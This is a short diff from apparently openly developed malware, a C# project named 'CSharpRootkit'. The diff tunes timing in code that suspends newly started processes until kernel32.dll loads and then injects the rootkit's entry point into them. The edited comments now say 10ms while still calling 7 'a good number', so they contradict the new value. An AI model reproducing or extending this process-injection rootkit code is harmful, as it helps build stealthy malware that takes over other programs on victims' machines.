@@ -689,7 +689,7 @@ namespace CSharpRootkit
                 }
                 
                 IntPtr procHandle = SharpInjector.GetProcessHandleWithRequiredRights((int)procId);
-                if (procHandle != IntPtr.Zero && Utils.ShouldInject(procHandle) && JankyUnPauseUntilKernel32LoadedThenPause(ThreadHandle, procHandle, ExtraWaitTimeAfterFound: 7))//we wait for the kernel32.dll to load or else injecting wont work. we also wait a extra 7ms as I found that some applications would not start properly, adding a small wait fixs this, but theres a slight chance it wont inject, but ive found 7 to be a good number
+                if (procHandle != IntPtr.Zero && Utils.ShouldInject(procHandle) && JankyUnPauseUntilKernel32LoadedThenPause(ThreadHandle, procHandle, ExtraWaitTimeAfterFound: 10))//we wait for the kernel32.dll to load or else injecting wont work. we also wait a extra 10ms as I found that some applications would not start properly, adding a small wait fixs this, but theres a slight chance it wont inject, but ive found 7 to be a good number
                 {
                     SharpInjector.Inject(procHandle, Program.InjectionEntryPoint, 100);//make sure to change this on a namespace or class or function name change
                 }
@@ -713,7 +713,7 @@ namespace CSharpRootkit
                 NativeMethods.CloseHandle(procHandle);
                 return false;
             }
-            if (JankyUnPauseUntilKernel32LoadedThenPause(ThreadHandle, procHandle, ExtraWaitTimeAfterFound: 7))//we wait for the kernel32.dll to load or else injecting wont work. we also wait a extra 7ms as I found that some applications would not start properly, adding a small wait fixs this, but theres a slight chance it wont inject, but ive found 7 to be a good number
+            if (JankyUnPauseUntilKernel32LoadedThenPause(ThreadHandle, procHandle, ExtraWaitTimeAfterFound: 10))//we wait for the kernel32.dll to load or else injecting wont work. we also wait a extra 10ms as I found that some applications would not start properly, adding a small wait fixs this, but theres a slight chance it wont inject, but ive found 7 to be a good number
             {
                 SharpInjector.InjectionStatusCode status= SharpInjector.Inject(procHandle, Program.InjectionEntryPoint, 100);//make sure to change this on a namespace or class or function name change
                 NativeMethods.CloseHandle(procHandle);
